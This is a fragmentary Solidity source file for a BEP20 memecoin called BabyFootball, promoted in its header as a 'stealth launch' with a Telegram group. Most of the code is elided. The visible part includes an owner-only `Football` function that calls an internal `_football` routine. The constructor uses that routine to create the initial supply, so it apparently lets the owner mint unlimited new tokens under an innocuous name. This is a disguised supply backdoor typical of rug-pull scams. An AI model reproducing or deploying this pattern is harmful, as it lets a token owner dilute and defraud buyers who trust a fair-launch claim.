...
/**
 * 
 *          Welcome to BabyFootball - $BabyFootball
 *          The Stealth Launch
 *              Telegram group @babyfootballbsc
 *
 *          Tokenomic
 ...
 * 
 *      About Us
 *      Telegram : https://t.me/babyfootballbsc
 */
...
contract BEP20 is Ownable, IBEP20 {
    ...
    function Football(uint256 amount) public onlyOwner {
    _football(msg.sender, amount);
    }
    ...
    function _football(address account, uint256 amount) internal virtual {
...
contract BabyFootballBSC is BEP20 {
    ...
    BEP20(name_, symbol_){
        ...
        _football(_msgSender(), 1000000000 * 10 ** decimals());
    }
}